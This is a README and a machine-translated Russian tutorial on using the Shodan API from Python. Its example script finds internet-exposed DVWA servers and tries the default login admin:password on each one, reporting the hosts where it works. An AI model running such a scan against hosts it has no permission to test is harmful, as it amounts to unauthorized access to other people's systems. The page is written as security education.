# [How to Use Shodan API in Python](https://www.thepythoncode.com/article/using-shodan-api-in-python)
To run this:
- `pip3 install -r requirements.txt`
- Get Shodan API key and edit `shodan_api.py` API key and change on your needs.
- Run `shodan_api.py`
##
# [[] / []]()
Публичные IP-адреса маршрутизируются в Интернете, что означает, что соединение может быть установлено между любым хостом, имеющим публичный IP-адрес, и любым другим хостом, подключенным к Интернету, без брандмауэра, фильтрующего исходящий трафик, и поскольку IPv4 по-прежнему является доминирующим протоколом в Интернете, в настоящее время возможно и практично сканировать весь Интернет.

Есть несколько платформ, которые предлагают интернет-сканирование как услугу, чтобы перечислить несколько; Shodan, Censys и ZoomEye. Используя эти сервисы, мы можем сканировать Интернет на наличие устройств, работающих с данной услугой, и мы можем найти камеры наблюдения, промышленные системы управления, такие как электростанции, серверы, устройства IoT и многое другое.

Эти сервисы часто предлагают API, который позволяет программистам в полной мере использовать результаты сканирования; они также используются менеджерами по продуктам для проверки приложений исправлений и получения общей картины о доле рынка с конкурентами, а также используются исследователями безопасности для поиска уязвимых хостов и создания отчетов о воздействиях уязвимостей.

Связанные с: Создание 24 этических хакерских скриптов и инструментов с помощью Python Book

В этом уроке мы рассмотрим API Shodan с использованием Python и некоторые из его практических вариантов использования.

Shodan на сегодняшний день является самой популярной поисковой системой IoT. Он был создан в 2009 году и имеет веб-интерфейс для ручного изучения данных, а также REST API и библиотеки для самых популярных языков программирования, включая Python, Ruby, Java и C#.

Использование большинства функций Shodan требует членства в Shodan, которое стоит 49 долларов на момент написания статьи для пожизненного обновления и которое бесплатно для студентов, преподавателей и ИТ-персонала. Обратитесь к этой странице для получения дополнительной информации.

Как только вы станете участником, вы можете вручную исследовать данные. Попробуем найти незащищенные камеры безопасности Axis:

Поиск камер видеонаблюденияКак видите, поисковая система довольно мощная, особенно с поисковыми фильтрами. Если вы хотите протестировать более крутые запросы, мы рекомендуем проверить этот список удивительных поисковых запросов Shodan.

Теперь попробуем использовать Shodan API. Сначала мы переходим к нашей учетной записи, чтобы получить наш ключ API:

Получение ключа API ShodanЧтобы начать работу с Python, нам нужно установить библиотеку shodan:

pip3 install shodan
Пример, который мы будем использовать в этом учебнике, заключается в том, что мы создаем сценарий, который ищет экземпляры DVWA (Damn Vulnerable Web Application), которые все еще имеют учетные данные по умолчанию, и сообщает о них.

DVWA - это проект с открытым исходным кодом, созданный для тестирования безопасности; это веб-приложение, которое уязвимо по своей конструкции; ожидается, что пользователи развернут его на своих компьютерах, чтобы использовать его. Мы попытаемся найти экземпляры в Интернете, у которых он уже развернут, чтобы использовать его без установки.

Должно быть много способов поиска экземпляров DVWA, но мы будем придерживаться названия, так как это просто:

Поиск экземпляров DVWAСложность выполнения этой задачи вручную заключается в том, что для большинства экземпляров учетные данные для входа должны быть изменены. Итак, чтобы найти доступные экземпляры DVWA, необходимо попробовать учетные данные по умолчанию для каждого из обнаруженных экземпляров, мы сделаем это с Python:

import shodan
import time
import requests
import re

# your shodan API key
SHODAN_API_KEY = '<YOUR_SHODAN_API_KEY_HERE>'
api = shodan.Shodan(SHODAN_API_KEY)
Получите: Создайте 24 этических хакерских скрипта и инструмента с помощью Python Book

Теперь давайте напишем функцию, которая запрашивает страницу результатов из Shodan. Одна страница может содержать до 100 результатов, и мы добавляем цикл для безопасности. В случае возникновения ошибки сети или API мы продолжаем повторять попытку со вторыми задержками, пока она не сработает:

# requests a page of data from shodan
def request_page_from_shodan(query, page=1):
    while True:
        try:
            instances = api.search(query, page=page)
            return instances
        except shodan.APIError as e:
            print(f"Error: {e}")
            time.sleep(5)
Определим функцию, которая принимает хост и проверяет, допустимы ли учетные данные admin:password (значения по умолчанию для DVWA); это не зависит от библиотеки Шодан. Мы будем использовать библиотеку запросов для отправки наших учетных данных и проверки результата:

# Try the default credentials on a given instance of DVWA, simulating a real user trying the credentials
# visits the login.php page to get the CSRF token, and tries to login with admin:password
def has_valid_credentials(instance):
    sess = requests.Session()
    proto = ('ssl' in instance) and 'https' or 'http'
    try:
        res = sess.get(f"{proto}://{instance['ip_str']}:{instance['port']}/login.php", verify=False)
    except requests.exceptions.ConnectionError:
        return False
    if res.status_code != 200:
        print("[-] Got HTTP status code {res.status_code}, expected 200")
        return False
    # search the CSRF token using regex
    token = re.search(r"user_token' value='([0-9a-f]+)'", res.text).group(1)
    res = sess.post(
        f"{proto}://{instance['ip_str']}:{instance['port']}/login.php",
        f"username=admin&password=password&user_token={token}&Login=Login",
        allow_redirects=False,
        verify=False,
        headers={'Content-Type': 'application/x-www-form-urlencoded'}
    )
    if res.status_code == 302 and res.headers['Location'] == 'index.php':
        # Redirects to index.php, we expect an authentication success
        return True
    else:
        return False
Связанные с: Как автоматизировать вход с помощью Selenium в Python.

Приведенная выше функция отправляет запрос GET на страницу входа DVWA для получения user_token. Затем он отправляет запрос POST с именем пользователя, паролем и маркером CSRF по умолчанию, а затем проверяет, была ли проверка подлинности успешной.

Напишем функцию, которая принимает запрос и перебирает страницы в результатах поиска Shodan, и для каждого хоста на каждой странице мы вызываем функцию has_valid_credentials():

# Takes a page of results, and scans each of them, running has_valid_credentials
def process_page(page):
    result = []
    for instance in page['matches']:
        if has_valid_credentials(instance):
            print(f"[+] valid credentials at : {instance['ip_str']}:{instance['port']}")
            result.append(instance)
    return result

# searches on shodan using the given query, and iterates over each page of the results
def query_shodan(query):
    print("[*] querying the first page")
    first_page = request_page_from_shodan(query)
    total = first_page['total']
    already_processed = len(first_page['matches'])
    result = process_page(first_page)
    page = 2
    while already_processed < total:
        # break just in your testing, API queries have monthly limits
        break
        print("querying page {page}")
        page = request_page_from_shodan(query, page=page)
        already_processed += len(page['matches'])
        result += process_page(page)
        page += 1
    return result

# search for DVWA instances
res = query_shodan('title:dvwa')
print(res)
Это можно значительно улучшить, воспользовавшись преимуществами многопоточности для ускорения нашего сканирования, так как мы могли бы параллельно проверять хосты, проверьте этот учебник, который может вам помочь.

Вот выходные данные скрипта:

Результат скрипта Python для поиска уязвимых экземпляров DVWA с помощью Shodan APIКак видите, этот скрипт Python работает и сообщает о хостах, которые имеют учетные данные по умолчанию на экземплярах DVWA.

Читайте также: Как извлекать и отправлять веб-формы из URL-адреса с помощью Python.

Заключение
Сканирование экземпляров DVWA с учетными данными по умолчанию может быть не самым полезным примером, так как приложение сделано уязвимым по замыслу, и большинство людей, использующих его, не изменяют свои учетные данные.

Тем не менее, использование Shodan API очень мощное, и приведенный выше пример показывает, как можно перебирать результаты сканирования и обрабатывать каждый из них с помощью кода. API поиска является самым популярным, но Shodan также поддерживает сканирование по требованию, мониторинг сети и многое другое. Дополнительные сведения см. в справочнике по API.

Отказ от ответственности: Мы не рекомендуем вам заниматься незаконной деятельностью. С большой силой приходит большая ответственность. Использование Shodan не является незаконным, но учетные данные грубого принуждения на маршрутизаторах и службах являются таковыми, и мы не несем ответственности за любое неправильное использование API или кода Python, который мы предоставили.